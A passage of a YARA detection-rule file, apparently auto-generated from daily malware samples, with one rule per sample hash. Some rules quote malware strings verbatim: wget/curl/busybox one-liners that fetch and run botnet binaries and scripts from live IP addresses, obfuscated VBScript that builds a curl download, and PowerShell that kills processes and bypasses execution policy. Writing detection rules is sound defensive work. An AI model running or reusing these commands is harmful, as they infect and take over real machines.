      $s14 = "        <a href=\"/login?return_to=%2FKami32X%2FOsiris\" rel=\"nofollow\" data-hydro-click=\"{&quot;event_type&quot;:&quot;authe" ascii
      $s15 = "          <a icon=\"repo-forked\" id=\"fork-button\" href=\"/login?return_to=%2FKami32X%2FOsiris\" rel=\"nofollow\" data-hydro-c" ascii
      $s16 = "  <script type=\"application/json\" data-target=\"react-partial.embeddedData\">{\"props\":{\"docsUrl\":\"https://docs.github.com" ascii
      $s17 = "  <a id=\"projects-tab\" href=\"/Kami32X/Osiris/projects\" data-tab-item=\"i4projects-tab\" data-selected-links=\"repo_projects " ascii
      $s18 = "  <a id=\"pull-requests-tab\" href=\"/Kami32X/Osiris/pulls\" data-tab-item=\"i2pull-requests-tab\" data-selected-links=\"repo_pu" ascii
      $s19 = "  <a class=\"HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary\" data-analytics-event=\"{&quo" ascii
      $s20 = "\"https://avatars.githubusercontent.com/u/171483775?v=4\",\"public\":true,\"private\":false,\"isOrgOwned\":false},\"codeLineWrap" ascii
   condition:
      uint16(0) == 0x0a0a and filesize < 600KB and
      1 of ($x*) and all of them
}

rule b5ced80db3e75b3339dfcbdfa414c429fb7adff2590ab238e1ded62a0f10b795 {
   meta:
      description = "evidences - file b5ced80db3e75b3339dfcbdfa414c429fb7adff2590ab238e1ded62a0f10b795.apk"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "b5ced80db3e75b3339dfcbdfa414c429fb7adff2590ab238e1ded62a0f10b795"
   strings:
      $s1 = "OOThemeOverlay.MaterialComponents.MaterialAlertDialog.Picker.Date.Header.Text.Day" fullword ascii
      $s2 = "KKThemeOverlay.MaterialComponents.MaterialAlertDialog.Picker.Date.Header.Text" fullword ascii
      $s3 = "66Widget.MaterialComponents.Button.UnelevatedButton.Icon" fullword ascii
      $s4 = "11Widget.MaterialComponents.Button.UnelevatedButton" fullword ascii
      $s5 = "  passwordToggleContentDescription" fullword ascii
      $s6 = "##password_toggle_content_description" fullword ascii
      $s7 = "88Widget.MaterialComponents.Button.TextButton.Dialog.Flush" fullword ascii
      $s8 = "res/drawable/design_password_eye.xml" fullword ascii
      $s9 = "22Widget.MaterialComponents.Button.TextButton.Dialog" fullword ascii
      $s10 = "77Widget.MaterialComponents.Button.TextButton.Dialog.Icon" fullword ascii
      $s11 = "22Base.Widget.AppCompat.Button.ButtonBar.AlertDialog" fullword ascii
      $s12 = "$$res/drawable/design_password_eye.xml" fullword ascii
      $s13 = "11Widget.MaterialComponents.CompoundButton.CheckBox" fullword ascii
      $s14 = "44Widget.MaterialComponents.CompoundButton.RadioButton" fullword ascii
      $s15 = "GGThemeOverlay.MaterialComponents.MaterialAlertDialog.Picker.Date.Spinner" fullword ascii
      $s16 = "00Base.Widget.AppCompat.CompoundButton.RadioButton" fullword ascii
      $s17 = "%%res/layout/test_toolbar_elevation.xml" fullword ascii
      $s18 = "66ThemeOverlay.MaterialComponents.Dialog.Alert.Framework" fullword ascii
      $s19 = "AABase.ThemeOverlay.MaterialComponents.Light.Dialog.Alert.Framework" fullword ascii
      $s20 = "**mtrl_exposed_dropdown_menu_popup_elevation" fullword ascii
   condition:
      uint16(0) == 0x4b50 and filesize < 9000KB and
      8 of them
}

rule sig_977a0b7beb5eba9cc9e61c9fcd17a8e37ec9780039d017fcc6720c1df2cb9462 {
   meta:
      description = "evidences - file 977a0b7beb5eba9cc9e61c9fcd17a8e37ec9780039d017fcc6720c1df2cb9462.rar"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "977a0b7beb5eba9cc9e61c9fcd17a8e37ec9780039d017fcc6720c1df2cb9462"
   strings:
      $s1 = "PO-000172483 pdf.exe" fullword ascii
      $s2 = "vjnjtntq" fullword ascii
      $s3 = "{w7f:\"" fullword ascii
      $s4 = "PPJJGGE" fullword ascii
      $s5 = "Zz -Rb" fullword ascii
      $s6 = "CHXVyL3" fullword ascii
      $s7 = "6hO: -d" fullword ascii
      $s8 = "D0G*+ " fullword ascii
      $s9 = "swgthh" fullword ascii
      $s10 = "TWCtpH5" fullword ascii
      $s11 = "09?=%dp%u" fullword ascii
      $s12 = "W- [`Iv#B" fullword ascii
      $s13 = "%I8m- iB" fullword ascii
      $s14 = "uTnXHQj$C" fullword ascii
      $s15 = "yvwo5Z_" fullword ascii
      $s16 = "H/?.nrJJvrm" fullword ascii
      $s17 = "NcIDVFLnM)W" fullword ascii
      $s18 = "aTtagB'T" fullword ascii
      $s19 = "hdnzp\\X" fullword ascii
      $s20 = "YshK<ZY8" fullword ascii
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      8 of them
}

rule aa87add8eac45d75a0280814b16feb4fd94c64e00b86bcd4a4f511e19bd8636a {
   meta:
      description = "evidences - file aa87add8eac45d75a0280814b16feb4fd94c64e00b86bcd4a4f511e19bd8636a.rar"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "aa87add8eac45d75a0280814b16feb4fd94c64e00b86bcd4a4f511e19bd8636a"
   strings:
      $s1 = "PO-000172483 pdf.exe" fullword ascii
      $s2 = "no- -R" fullword ascii
      $s3 = "JO:\\:q" fullword ascii
      $s4 = "DPSSKWS" fullword ascii
      $s5 = "AOSGWOEG" fullword ascii
      $s6 = "H- +_q" fullword ascii
      $s7 = "W -h%1i\\" fullword ascii
      $s8 = "mrj<%hpx%" fullword ascii
      $s9 = "ZoKKO53" fullword ascii
      $s10 = "- F7E1$=" fullword ascii
      $s11 = ":_\"V. * " fullword ascii
      $s12 = "S* %M^m" fullword ascii
      $s13 = "PlRtVrL0" fullword ascii
      $s14 = "dgjhih" fullword ascii
      $s15 = "QLU^ZBBW?J>U" fullword ascii
      $s16 = "kOGMh`s" fullword ascii
      $s17 = "8gTvT\\=" fullword ascii
      $s18 = "QhwTD\"6" fullword ascii
      $s19 = "bmw=hvZSRq}Q+&L#T" fullword ascii
      $s20 = "iiFE}\"" fullword ascii
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      8 of them
}

rule a21f4639ac5b2f46b8a75f0e0cc3d4c9165328014db7c2a9cdcc9fa8a8569d85 {
   meta:
      description = "evidences - file a21f4639ac5b2f46b8a75f0e0cc3d4c9165328014db7c2a9cdcc9fa8a8569d85.zip"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "a21f4639ac5b2f46b8a75f0e0cc3d4c9165328014db7c2a9cdcc9fa8a8569d85"
   strings:
      $s1 = "vcOb,uE" fullword ascii
      $s2 = "8jan.elfux" fullword ascii
      $s3 = "KGRVrNb>" fullword ascii
      $s4 = "VSPK}TlQh" fullword ascii
      $s5 = "qgoDQ^8'" fullword ascii
      $s6 = "weXVgXVgXVgXVgXVgXV" fullword ascii
      $s7 = "ckmy m" fullword ascii
      $s8 = "\\'>fwz" fullword ascii
      $s9 = "~cPl{7" fullword ascii
      $s10 = "V=.Y=.A" fullword ascii
      $s11 = "OpB)]<_N" fullword ascii
      $s12 = "H?9s|C" fullword ascii
      $s13 = "=c$9Gf" fullword ascii
      $s14 = "pf0y+uZGx" fullword ascii
      $s15 = "1$nW6=&v" fullword ascii
      $s16 = "sD>G8G" fullword ascii
      $s17 = "G\\;c-e" fullword ascii
      $s18 = "|p/Gt," fullword ascii
      $s19 = "g:tx!y" fullword ascii
      $s20 = "Kj]I}D" fullword ascii
   condition:
      uint16(0) == 0x4b50 and filesize < 200KB and
      8 of them
}

rule ae6d5f558e08966e3c1ed24a693feb1e091fb41f7a5558ec1fedaaf3fb595462 {
   meta:
      description = "evidences - file ae6d5f558e08966e3c1ed24a693feb1e091fb41f7a5558ec1fedaaf3fb595462.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "ae6d5f558e08966e3c1ed24a693feb1e091fb41f7a5558ec1fedaaf3fb595462"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;rm bins.sh;wget http://94.154.35.94/bins.sh;curl -O http://94.154.35.94/bi" ascii
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;rm bins.sh;wget http://94.154.35.94/bins.sh;curl -O http://94.154.35.94/bi" ascii
      $s3 = "ns.sh;/bin/busybox wget http://94.154.35.94/bins.sh; chmod 777 bins.sh;./bins.sh" fullword ascii
   condition:
      uint16(0) == 0x6463 and filesize < 1KB and
      all of them
}

rule af4c93c424fa2cd610b6b268ccfb4a40b419db27d9e1efdfcf9570d391d51a8b {
   meta:
      description = "evidences - file af4c93c424fa2cd610b6b268ccfb4a40b419db27d9e1efdfcf9570d391d51a8b.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "af4c93c424fa2cd610b6b268ccfb4a40b419db27d9e1efdfcf9570d391d51a8b"
   strings:
      $s1 = "/%jpO%" fullword ascii
      $s2 = "lE=* U^" fullword ascii
      $s3 = "dpJs#\\" fullword ascii
      $s4 = ")<bBMM[b(3" fullword ascii
      $s5 = "nhyM_J(" fullword ascii
      $s6 = "eJDpd0O" fullword ascii
      $s7 = "NDJMkuz" fullword ascii
      $s8 = "GcJmI|f" fullword ascii
      $s9 = "fEyOu*[m" fullword ascii
      $s10 = "MCDpFu~s" fullword ascii
      $s11 = "UlyD9k#r" fullword ascii
      $s12 = "felQ%Q>\\~" fullword ascii
      $s13 = "]ywbx@Fu" fullword ascii
      $s14 = "hkDqK')" fullword ascii
      $s15 = "fieZKK<@" fullword ascii
      $s16 = "Mejcq+c\\" fullword ascii
      $s17 = "khGc{wR" fullword ascii
      $s18 = "'%D#P}" fullword ascii
      $s19 = "Swfe i\\l" fullword ascii
      $s20 = "C8.ixT" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 900KB and
      8 of them
}

rule bebb0ff043cb40ec2fc9f1e6c01bfa53aa8e063c4271986497abb2646708d837 {
   meta:
      description = "evidences - file bebb0ff043cb40ec2fc9f1e6c01bfa53aa8e063c4271986497abb2646708d837.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "bebb0ff043cb40ec2fc9f1e6c01bfa53aa8e063c4271986497abb2646708d837"
   strings:
      $s1 = "PROT_EXEC|PROT_WRITE failed." fullword ascii
      $s2 = "+ K$S$" fullword ascii
      $s3 = "y^v.RTR" fullword ascii
      $s4 = "iuuV6.K" fullword ascii
      $s5 = "9&\\Vvy" fullword ascii
      $s6 = "~fo)\"4" fullword ascii
      $s7 = "5MH$>Zf" fullword ascii
      $s8 = "Or)FKB" fullword ascii
      $s9 = "4.002021" fullword ascii
      $s10 = "HOX.C:" fullword ascii
      $s11 = "Jv5OYq\\" fullword ascii
      $s12 = "CS|6KFNU" fullword ascii
      $s13 = "ue7m]V" fullword ascii
      $s14 = "8+ds7o" fullword ascii
      $s15 = "H~YDR6" fullword ascii
      $s16 = "Y^Z'J\\" fullword ascii
      $s17 = "^:_'XGGg" fullword ascii
      $s18 = "!'o%<5" fullword ascii
      $s19 = "` J]#?" fullword ascii
      $s20 = "B=].PJ" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      8 of them
}

rule c05a5502d1930a6c7732fbadd199a1d8df379734659ab8309994b4a9af603a22 {
   meta:
      description = "evidences - file c05a5502d1930a6c7732fbadd199a1d8df379734659ab8309994b4a9af603a22.js"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "c05a5502d1930a6c7732fbadd199a1d8df379734659ab8309994b4a9af603a22"
   strings:
      $s1 = "function _XkNeqJdmVQQCvOdSeEfkxusQnkPjYXOvRkGYNGKHzPfpfLrhkLCciTcODgEcvYPDSmHKvklPQPaAXBUZIyJPlLXGSVQjJGoSqMkWKitBztJKfhaKVcRxcj" ascii
      $s2 = "oaMjMREmpvRLwgWzoWjkwEaAbJqyeKthlNAGUgWyCxilKGMoMQKjhElOQtKhBecfNBXNmOKwKmxnjKvVLlTxvYtsyDkGZAvtArWTlSRLntpMsnOHuAsGFIjbRoNBe272" ascii
      $s3 = "d2iLknYfrzejQ+cPCdIPagsTxVPYbLEfB8j1Gu5AUR9M6rmPOg/1svVGABbOQvZZ3Y4ss2W1mhCrMP26klBNuQoghZloYxggMBMIIC/QIBATBoMFQxCzAJBgNVBAYTAk" ascii
      $s4 = "oTnbPU1knpy24wUFBkfenBa+pRFHwCBB1QtS+vGNRhsceP3kSPNrrfN2sRzFYsNfrFaWz8YOdU254qNZQfd9O/VjxZ2Gjr3xgANHtM3HxfzPYF6/pKK8EE4dj66qKKtm" ascii
      $s5 = "ymZWIfRTLNHVXRJYXvGiTzLBC+MjDjnIoOuPLoaOViR/IGnG+7OtQn0nIrKrTX8hsOu9DMhCgBCnJiLyIi5EUyIbfA1yQhMtYBrNhAUfe0+teCGmbdQ1WZBSdpayzkIB" ascii
      $s6 = "yIaMiJ3iYafbY2lBpq7YQvNHjuY8aqC7luOzFWYg4xvd2E3UORn5olASQ4apNC/HqmGsDIhP3Ho0bjIASjtyo0tJWjAkp8qt7sF657EKOrhL5tNGKvZUHOiDULKp/e3E" ascii
      $s7 = "aMjMREmpvRLwgWzoWjkwEaAbJqyeKthlNAGUgWyCxilKGMoMQKjhElOQtKhBecfNBXNmOKwKmxnjKvVLlTxvYtsyDkGZAvtArWTlSRLntpMsnOHuAsGFIjbRoNBe149b" ascii
      $s8 = "3VZ08oXgXukEx658b00Pz6zT4yRhMgNooE6reqB0acDZM6CWaZWFwpo7kMpjA4PNBGNjV8nLruw9X5Cnb6fgUbQMqSNenVetG1fwCuqZCqxX8BnBCxFvzMbhjcb2L+pl" ascii
      $s9 = "2BSFKEMdoy7BXkpkw9bDlz1AuFOSDghRpo4adIOKnRNiV3wY0ZFsWITGZ9L2POmOhp36w8qF2dyRxbrtjzL3TPuH7214OdEZZimq5FE9p/3Ef738NSn+YGVemdjPI6Yl" ascii
      $s10 = "l0ZWQxITAfBgNVBAMMGFlramdraXVzcnZlbCBHcnpuIFJvamJzdTAeFw0yOTg0MzMwMDAwMDBaFw03NTMzMTYyMzU5NTlaMFYxCzAJBgNVBAYTAkdCMRgwFgYDVQQKEw" ascii
      $s11 = "fH07nIlpbdtDVa1c9S5U36E2JchFaVoxv1k0mmiYV+PfLzHfFtIGEs47cRtUdGSa5qJVOi43srNtg5oxM51IDPbWiWSgjtCf2BdGQpsqytYMORhYOOYA+22A8mEyb0jd" ascii
      $s12 = "E/TpKF2dGq1mVXn37zK/4oiETkgsyqA5lgAQ0c1f1IkOb6rGnhWqkHcxX+HnfKXjVodTmmV52L2UIFsf0l4iQ0UgKJUc2RGarhOnG3B++OxR53LPys3J9AnL9o6zlviz" ascii
      $s13 = "Y6aHR0cDovL2NybC5zZWN0aWdvLmNvbS9TZWN0aWdvUHVibGljQ29kZVNpZ25pbmdSb290UjQ2LmNybDB7BggrBgEFBQcBAQRvMG0wRgYIKwYBBQUHMAKGOmh0dHA6Ly" ascii
      $s14 = "kGA1UEBhMCR0IxGDAWBgNVBAoTD1NlY3RpZ28gTGltaXRlZDErMCkGA1UEAxMiU2VjdGlnbyBQdWJsaWMgQ29kZSBTaWduaW5nIENBIFIzNjAeFw0yMjAzMDMwMDAwMD" ascii
      $s15 = "3nlBIiBCR0Lv8WIwKSirauNoWsR9QjkSs+3H3iMaBRb6yEkeNSirXilt7Qh2MkiYr/7xKTO327toq9vQV/J5trZdOlDGmxvEk5mvFtbqrkoIMn2poNK1DpS1uzuGQ2pH" ascii
      $s16 = "5pbmdDQVIzNi5jcnQwIwYIKwYBBQUHMAGGF2h0dHA6Ly9vY3NwLnNlY3RpZ28uY29tMA0GCSqGSIb3DQEBDAUAA4IBgQBl3SC2qT5riTWp0W1E4AHVJolgQ9e1qEWKWk" ascii
      $s17 = "wwviJMBZL4xVd40uPWUnOJUoSiugaz0yWLODRtQxs5qU6E58KKmfHwJotl5WZ7nIQuDT0mWjwEx7zSM7fs9Tx6N+Q/3+49qTtUvAQsrEAxwmzOTJ6Jp6uWmHCgrHW4dH" ascii
      $s18 = "ltaXRlZDEtMCsGA1UEAxMkU2VjdGlnbyBQdWJsaWMgQ29kZSBTaWduaW5nIFJvb3QgUjQ2MB4XDTIxMDMyMjAwMDAwMFoXDTM2MDMyMTIzNTk1OVowVDELMAkGA1UEBh" ascii
      $s19 = "DoaMjMREmpvRLwgWzoWjkwEaAbJqyeKthlNAGUgWyCxilKGMoMQKjhElOQtKhBecfNBXNmOKwKmxnjKvVLlTxvYtsyDkGZAvtArWTlSRLntpMsnOHuAsGFIjbRoNBe2e" ascii
      $s20 = "2A5wHS7+uCKZVwjf+7Fc/+0Q82oi5PMpB0RmtHNRN3BTNPYy64LeG/ZacEaxjYcfrMCPJtiZkQsa3bPizkqhiwxgcBdWfebeljYx42f2mJvqpFPm5aX4+hW8udMIYw6A" ascii
   condition:
      uint16(0) == 0x7566 and filesize < 200KB and
      8 of them
}

rule c1f6f312624cb597d0101545cf5cf6874d83bb36ce89870335371a3990dfbf05 {
   meta:
      description = "evidences - file c1f6f312624cb597d0101545cf5cf6874d83bb36ce89870335371a3990dfbf05.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "c1f6f312624cb597d0101545cf5cf6874d83bb36ce89870335371a3990dfbf05"
   strings:
      $x1 = "wget http://77.221.157.206/zhoung/temp.tar ; curl -LO http://77.221.157.206/zhoung/temp.tar ; tar -xf temp.tar ; cd .ICE-Temp ; " ascii
      $x2 = "wget http://77.221.157.206/zhoung/temp.tar ; curl -LO http://77.221.157.206/zhoung/temp.tar ; tar -xf temp.tar ; cd .ICE-Temp ; " ascii
      $s3 = "chmod +x * ; ./start > /dev/null 2>&1 & disown" fullword ascii
   condition:
      uint16(0) == 0x6777 and filesize < 1KB and
      1 of ($x*) and all of them
}

rule cf5f824d411cde0e20573cdcf862e916985ec616e2bacb2d11af6b855a170729 {
   meta:
      description = "evidences - file cf5f824d411cde0e20573cdcf862e916985ec616e2bacb2d11af6b855a170729.vbs"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "cf5f824d411cde0e20573cdcf862e916985ec616e2bacb2d11af6b855a170729"
   strings:
      $s1 = "fimmjywfgj = fvirxnoasbofrgs.ExpandEnvironmentStrings(\"%TEMP%\")" fullword ascii
      $s2 = "fvirxnoasbofrgs.Run asoarsuwer+wzrnfkqno+jbdhswsckxnumgn+wzrnfkqno+ctfjuujtqipnit+wzrnfkqno+jmlytsnuratsm+wjqurnffcgbsg, False, " ascii
      $s3 = "fvirxnoasbofrgs.Run wjqurnffcgbsg, False, True" fullword ascii
      $s4 = "fvirxnoasbofrgs.Run asoarsuwer+wzrnfkqno+jbdhswsckxnumgn+wzrnfkqno+ctfjuujtqipnit+wzrnfkqno+jmlytsnuratsm+wjqurnffcgbsg, False, " ascii
      $s5 = "WScript.Sleep(2000)" fullword ascii
      $s6 = "Set fvirxnoasbofrgs = CreateObject(\"WScript.Shell\")" fullword ascii
      $s7 = "nnofjtbyv.DeleteFile(fimmjywfgj + \"\\\" + rwguooal)" fullword ascii
      $s8 = "nnofjtbyv.CreateTextFile(fimmjywfgj + \"\\\" + rwguooal)" fullword ascii
      $s9 = "Set nnofjtbyv = CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
      $s10 = "If Not nnofjtbyv.FileExists(fimmjywfgj + \"\\\" + rwguooal) Then" fullword ascii
      $s11 = ")+chr(105)+chr(108)+chr(104)+Left(Str, 0)+chr(105)+chr(97)+chr(114)+chr(105)+chr(111)+chr(46)+chr(110)+chr(101)+chr(116)+chr(47)" ascii
      $s12 = "ctfjuujtqipnit = chr(45)+chr(45)+chr(115)+Left(Str, 0)+chr(115)+chr(108)+chr(45)+chr(110)+chr(111)+chr(45)+chr(114)+chr(101)+chr" ascii
      $s13 = "wjqurnffcgbsg = chr(37)+chr(84)+Left(Str, 0)+chr(69)+chr(77)+chr(80)+chr(37)+chr(92)+chr(92)+chr(51)+chr(57)+chr(53)+Left(Str, 0" ascii
      $s14 = "(118)+Left(Str, 0)+chr(111)+chr(107)+chr(101)+Left(Str, 0)" fullword ascii
      $s15 = "rwguooal = chr(120)+chr(120)+chr(95)+Left(Str, 0)+chr(100)+chr(101)+Left(Str, 0)+chr(98)+Left(Str, 0)+chr(117)+chr(103)+chr(46)+" ascii
      $s16 = "ctfjuujtqipnit = chr(45)+chr(45)+chr(115)+Left(Str, 0)+chr(115)+chr(108)+chr(45)+chr(110)+chr(111)+chr(45)+chr(114)+chr(101)+chr" ascii
      $s17 = "chr(108)+chr(111)+chr(103)+Left(Str, 0)" fullword ascii
      $s18 = "jbdhswsckxnumgn = chr(34)+chr(104)+chr(116)+chr(116)+chr(112)+chr(115)+chr(58)+chr(47)+chr(47)+chr(105)+chr(109)+chr(111)+chr(98" ascii
      $s19 = "asoarsuwer = chr(99)+chr(109)+chr(100)+chr(32)+chr(47)+chr(99)+chr(32)+chr(99)+Left(Str, 0)+chr(117)+chr(114)+chr(108)+Left(Str," ascii
      $s20 = "jmlytsnuratsm = \"-o\"" fullword ascii
   condition:
      uint16(0) == 0x6e4f and filesize < 5KB and
      8 of them
}

rule d82cadfdd5c7611fc25978f7c500de4bb32a11ef202bc972c83a0815e625da66 {
   meta:
      description = "evidences - file d82cadfdd5c7611fc25978f7c500de4bb32a11ef202bc972c83a0815e625da66.ps1"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "d82cadfdd5c7611fc25978f7c500de4bb32a11ef202bc972c83a0815e625da66"
   strings:
      $x1 = "# Get processes with .bat or powershell in their command lines and stop them forcefully" fullword ascii
      $x2 = "Get-Process | Where-Object { $_.MainModule.FileName -like '*\\*.bat' -or $_.MainModule.FileName -like '*\\powershell*' } | ForEa" ascii
      $x3 = "Get-Process | Where-Object { $_.MainModule.FileName -like '*\\*.bat' -or $_.MainModule.FileName -like '*\\powershell*' } | ForEa" ascii
      $s4 = "    Get-Process -Name $_ -ErrorAction SilentlyContinue | Stop-Process -Force" fullword ascii
      $s5 = "20352074326347222123303251365266" ascii /* hex encoded string ' 5 t2cG"!#02Q6Rf' */
      $s6 = "-Scope CurrentUser Bypass -Force" fullword ascii
      $s7 = "-Object { Stop-Process -Id $_.Id -Force }" fullword ascii
      $s8 = "204270313247312322" ascii /* hex encoded string ' Bp12G1#"' */
      $s9 = "354252332074" ascii /* hex encoded string '5BR3 t' */
      $s10 = "7230372323255347" ascii /* hex encoded string 'r07##%SG' */
      $s11 = "0034004021" ascii /* hex encoded string '4@!' */
      $s12 = "0020007066" ascii /* hex encoded string ' pf' */
      $s13 = "0071204021" ascii /* hex encoded string 'q @!' */
      $s14 = "77266267267267267267267267267267267267267267267267267267267267267267267267267267267267267267267267267267267267267267267267267267" ascii /* hex encoded string 'w&bg&rg&rg&rg&rg&rg&rg&rg&rg&rg&rg&rg&rg&rg&rg&rg&rg&rg&rg&rg&rg&rg&rV'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'rw'r' */
      $s15 = "773773773773773773" ascii /* hex encoded string 'w7sw7sw7s' */
      $s16 = "226531415631" ascii /* hex encoded string '"e1AV1' */
      $s17 = "724522235524" ascii /* hex encoded string 'rE"#U$' */
      $s18 = "422632416637" ascii /* hex encoded string 'B&2Af7' */
      $s19 = "252252252252252252252252252252252252252252252252" ascii /* hex encoded string '%"R%"R%"R%"R%"R%"R%"R%"R' */
      $s20 = "213435315221" ascii /* hex encoded string '!451R!' */
   condition:
      uint16(0) == 0x2026 and filesize < 15000KB and
      1 of ($x*) and 4 of them
}

rule da39d00f542105deaa45a6d2dff734a4fd05d13344ef56bd550381d9d91fc863 {
   meta:
      description = "evidences - file da39d00f542105deaa45a6d2dff734a4fd05d13344ef56bd550381d9d91fc863.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "da39d00f542105deaa45a6d2dff734a4fd05d13344ef56bd550381d9d91fc863"
   strings:
      $s1 = "@4#-~&b._" fullword ascii /* hex encoded string 'K' */
      $s2 = "IZJ:\"T" fullword ascii
      $s3 = "z/_* J" fullword ascii
      $s4 = "?_vyR+ " fullword ascii
      $s5 = "- y;U:" fullword ascii
      $s6 = "XrbGbK4" fullword ascii
      $s7 = "\\GGlA+05" fullword ascii
      $s8 = "jYCPlsB;" fullword ascii
      $s9 = "tASuVH%" fullword ascii
      $s10 = "]OtNzt\\b" fullword ascii
      $s11 = "xGue KA" fullword ascii
      $s12 = "Lw.yDi" fullword ascii
      $s13 = "Ozhqk]clF(o" fullword ascii
      $s14 = "VmyUw\"pb" fullword ascii
      $s15 = "jTUQorN^" fullword ascii
      $s16 = "]ZXIDf_a" fullword ascii
      $s17 = "u,LVMuuS{" fullword ascii
      $s18 = "XVEq'MJ" fullword ascii
      $s19 = "_OZIi+Z;" fullword ascii
      $s20 = "zxEAo[\\" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 2000KB and
      8 of them
}

rule e8423ae37bbde2bed7aea0527d6b1b962f1cb4eeeb3651693b59bb881b874a52 {
   meta:
      description = "evidences - file e8423ae37bbde2bed7aea0527d6b1b962f1cb4eeeb3651693b59bb881b874a52.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "e8423ae37bbde2bed7aea0527d6b1b962f1cb4eeeb3651693b59bb881b874a52"
   strings:
      $s1 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf ppc ; /bin/busybox wget http://91.188.254.21/oops/loki.ppc ; chmod 777 lok" ascii
      $s2 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf ppc ; /bin/busybox wget http://91.188.254.21/oops/loki.ppc ; chmod 777 lok" ascii
      $s3 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf spc ; /bin/busybox wget http://91.188.254.21/oops/loki.spc ; chmod 777 lok" ascii
      $s4 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf spc ; /bin/busybox wget http://91.188.254.21/oops/loki.spc ; chmod 777 lok" ascii
      $s5 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf arm7 ; /bin/busybox wget http://91.188.254.21/oops/loki.arm7 ; chmod 777 l" ascii
      $s6 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf arm5 ; /bin/busybox wget http://91.188.254.21/oops/loki.arm4 ; chmod 777 l" ascii
      $s7 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf x86 ; /bin/busybox wget http://91.188.254.21/oops/loki.x86 ; chmod 777 lok" ascii
      $s8 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf x86_64 ; /bin/busybox wget http://91.188.254.21/oops/loki.x86_64 ; chmod 7" ascii
      $s9 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf x86_64 ; /bin/busybox wget http://91.188.254.21/oops/loki.x86_64 ; chmod 7" ascii
      $s10 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf mips ; /bin/busybox wget http://91.188.254.21/oops/loki.mips ; chmod 777 l" ascii
      $s11 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf mpsl ; /bin/busybox wget http://91.188.254.21/oops/loki.mpsl ; chmod 777 l" ascii
      $s12 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf arm4 ; /bin/busybox wget http://91.188.254.21/oops/loki.arm5 ; chmod 777 l" ascii
      $s13 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf arm7 ; /bin/busybox wget http://91.188.254.21/oops/loki.arm7 ; chmod 777 l" ascii
      $s14 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf arm4 ; /bin/busybox wget http://91.188.254.21/oops/loki.arm5 ; chmod 777 l" ascii
      $s15 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf m68k ; /bin/busybox wget http://91.188.254.21/oops/loki.m68k ; chmod 777 l" ascii
      $s16 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf arm5 ; /bin/busybox wget http://91.188.254.21/oops/loki.arm4 ; chmod 777 l" ascii
      $s17 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf m68k ; /bin/busybox wget http://91.188.254.21/oops/loki.m68k ; chmod 777 l" ascii
      $s18 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf arm6 ; /bin/busybox wget http://91.188.254.21/oops/loki.arm6 ; chmod 777 l" ascii
